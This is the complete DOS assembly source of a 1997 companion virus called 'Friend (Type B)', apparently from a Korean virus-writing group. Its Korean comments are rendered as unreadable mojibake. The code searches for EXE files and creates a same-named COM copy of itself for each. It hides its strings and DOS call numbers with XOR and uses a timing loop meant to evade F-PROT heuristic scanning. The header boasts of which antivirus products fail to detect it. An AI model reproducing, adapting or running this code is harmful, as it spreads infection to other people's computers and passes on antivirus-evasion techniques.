;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;                                             \          \     \   \
;     Friend (Type B)                         \           \   \    \   98/03
;                      by Osiris / CVC        \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #01
;
; Virus Name : Friend (Type B)
; AV Name    : Frien
; Author     : Osiris of CVC
; Origin     : Corea
; Date       : 1997/09/05
;
; Type : Non memory resident Companion
;
; !****************************************************************************!
; *                                                                            *
; * �w�� !                                                                     *
; *    �����e �a����a ���a š�a���a. �a�B�ⷥ ����a���e �a�w�A�ᴡ�e�a.      *
; *    �A�b�a�e �� ���aš�a�� �����A�e ����e ���A�A ��Ё�ᕡ �����i ���� �g   *
; *    �e�a. �e�w �a��a ��З�a�� �a�a !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify & execute it !                                        *
; *                                                                            *
; !****************************************************************************!
;
; ���w�� Companion �a����a���a.
; CVL #03 �A�� �����E ���e ���弁 ��巡�a.
;
; �e�� ���Bɡ���A�� 1 ���� EXE �a���i �x�a ���� �a���w COM �a���i ����Ё���a.
;
; á�a�e �����E COM �a���e �b�A�a�e �E�a.
;
; * Friend (Type A) : �A�� ���
; ! Friend (Type B) : Anti-herustic ���� �a�w
;
;
; AV �A�a�a : 1998 �e 1�� �e�� DSAV,F-PROT,TBAV �A�� ���e�A�� �g�e�a.
; Heuristic Test : AVP �A�� ���e�A�a F-PROT �A�� �eѢ ���e�E�a.
;                  DrWeb �A�� ���e�E�a.
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

            .MODEL  TINY
            .CODE

 PARASIZE   EQU  (End_Memory-Friend+0Fh) SHR 4 + 13h

            org   100h

 Friend:
            call  Anti_Herustic             ; F-prot �� ���e�i �wЁ�e�a.
            jmp   Virus_Start               ; �a����a ���b

 Msg        db    0Dh,0Ah
            db    '[Friend] Type B. 1997/09'
            db    '(c) Copyleft Osiris of CVC (Corean Virus Club),Corea$'

 Ext        db    'C' XOR 12h, 'O' XOR 12h, 'M' XOR 12h ; �qѡ�� �A�� ���a.
            db    '*' XOR 12h, '.' XOR 12h, 'E' XOR 12h
            db    'X' XOR 12h, 'E' XOR 12h,  00 XOR 12h

 Virus_Start:
            mov   si, offset Ext            ; �qѡ���E �¸w�a ���a
            mov   di, offset Ext_COM        ; ���a �I ��
            mov   cx, 0009                  ; ����
 CopyExt:
            lodsb
            xor   al,12h                    ; ���a �A�e�� �qѡ���E ���w�i ΅�a.
            stosb
            loop  CopyExt

            mov   ah, (2fh xor 12h)         ; DTA ���a��
            call  call_Int21
            push  es                        ; DTA �t ��w
            push  bx

            mov   ah, (1ah xor 12h)         ; ������ DTA ���
            mov   dx, offset NewDTA
            call  call_Int21

            mov   ah,(4Eh xor 12h)          ; EXE �a�� �x��
            mov   cx,00100011B              ; ������w/�����a��
            mov   dx, offset Mask_EXE       ;
 Find_repeat:
            call  call_Int21                ;
            jc    Execute_EXE               ; �q�q ��ǩ �a���� ���a�e EXE ��З

 Infect_EXE:
            mov   si, offset NewDTA + 1Eh   ; SI = �a�� ���q
            call  ChgExt                    ; EXE -> COM, COM -> EXE

            mov   ax, (4300h xor 1234h)     ; �q�q �a�� �·�
            mov   dx, offset NewDTA + 1Eh   ; -> COM �a���� ���� �a�e�a ?
            call  call_Int21                ; �����i �x�i �� ���a�e �q�q�A�� ��
            jc    Drop_COM                  ; �a.

            mov   ah, (4Fh xor 12h)         ; �a�q �a�� �x��
            jmp   Find_repeat

 Drop_COM:
            mov   ah, (3ch xor 12h)         ; COM �a�� ����
            mov   cx, 00000011B             ; �����e / ����
            mov   dx, offset NewDTA + 1Eh   ;
            call  call_Int21

            xchg  ax,bx                     ; Ѕ�i �苡

            mov   ah, (40h xor 12h)         ; �a����a �a��
            mov   cx, offset End_virus - 100h ; �a����a ����
            mov   dx, 100h                  ; ����
            call  call_Int21

            mov   ah, (3eh xor 12h)         ; �a�� �h��
            call  call_Int21

 Execute_EXE:
            pop   dx                        ; ���� DTA ����
            pop   ds
            mov   ah,1ah
            int   21h

            mov   sp, offset End_Memory     ; �aȂ ����

            mov   ah,4ah                    ; �A���� ����
            mov   bx, PARASIZE
            int   21h

            call  Set_env                   ; ���� EXE �a�� ��З�i ���e �ŉw
                                            ; �w�b ���

            mov   si, offset Filename
            call  ChgExt                    ; �¸w�a �e�w

            mov   ax, 4b00h                 ; ���� EXE �a�� ��З
            mov   bx, offset Env_Block
            mov   dx, offset Filename
            int   21h

            mov   ah, 4dh                   ; ����t �苡
            int   21h
 Stop_virus:
            mov   ax, 4c00h                 ; �a����a �{����
            int   21h

;******************************************************************************
; �¸w�a �a���� (EXE -> COM, COM -> EXE)
; ���b SI = �a�����a �a�e �¸w�a
;******************************************************************************

 ChgExt     proc  near                      ; �¸w�a �a����

 Loop_Eof:
            lodsb
            or    al,al
            jnz   Loop_Eof

            mov   di,si
            sub   di,4                      ; DI = �¸w�a ��á
            mov   si, offset Ext_COM        ; SI = COM

            cmp   byte ptr [di],'E'         ; EXE �a�� ���a ?
            jz    mov_ext
            add   si,0005                   ; SI = EXE
 mov_ext:
            mov   cx,0003
            repz  movsb                     ; �¸w�a�a COM ���e EXE ��
                                            ; EXE ���e COM �a�� �a���a.
            ret
 ChgExt     Endp


;******************************************************************************
; �ŵw�w�b�A�� ����З�A ϩ�a�e ���� �苡
;******************************************************************************
 Set_Env    proc  near

            mov   PSP1,es
            mov   PSP2,es
            mov   PSP3,es

 Search_RD:                                 ; �a�� ��З�a�� ��Ё�� ϩ�a�e �t�i�i �i�a���a.
            xor   si,si
            mov   ds,ds:[002Ch]             ; ��З��ǥ �a���� ���q�i �i�a���a.

 Search_RD_LOOP:
            cmp   word ptr DS:[SI],0000     ; �a�����q��A�e 0000���a.
            jz    Get_FileName              ; PSP:[002Ch] --> �A�a���a
            inc   si
            jmp   Search_RD_LOOP

 Get_FileName:
            add   si,0004
            mov   dx,si                     ; �e�� ��З�A�e �a�����q

            mov   di, offset Filename
            mov   cx,0080
            repz  movsb

            push  cs                        ;
            pop   ds
            RET

 Set_env    endp

;******************************************************************************
;           F-PROT �� �������w ��a�i ���b�� ��ǥ�a.
;******************************************************************************
 Anti_Herustic    Proc
                                            ; F-prot �A�A �� �a���a���e ���a�i
            mov   si,9452                   ; ���e�� ��� ���a�� �a�q�a�� �A��
 AH_Loop:                                   ; ���� ��� �a�� �g�A Ё�� ���e�i
            nop                             ; �wЁ�e�a.
            nop                             ;
            dec   si
            cld                             ;
            jnz   AH_Loop                   ;
            ret


 Anti_Herustic    Endp

;
; ������a 21h ѡ
;

 Call_Int21       proc

            xor   ax,1234h                  ;
            int   21h
            ret

 Call_Int21       endp

;
; ����З�i ���e �i��
;

 ENV_BLOCK  dw    ?                         ; ����З�w �i��
            dw    80h                       ;
 PSP1       dw    ?
            dw    5ch                       ;
 PSP2       dw    ?
            dw    6ch                       ;
 PSP3       dw    ?

 End_Virus:

 Ext_COM    db    3 dup (0)                 ; �¸w�a COM
 Mask_EXE   db    5 dup (0)                 ; *.EXE ��w

 Filename   db    85  dup (0)               ; �a�� ���q
 NewDTA     db    50  dup (0)               ; DTA
            db    100 dup (0)               ; �aȂ

 End_Memory:

            END   Friend

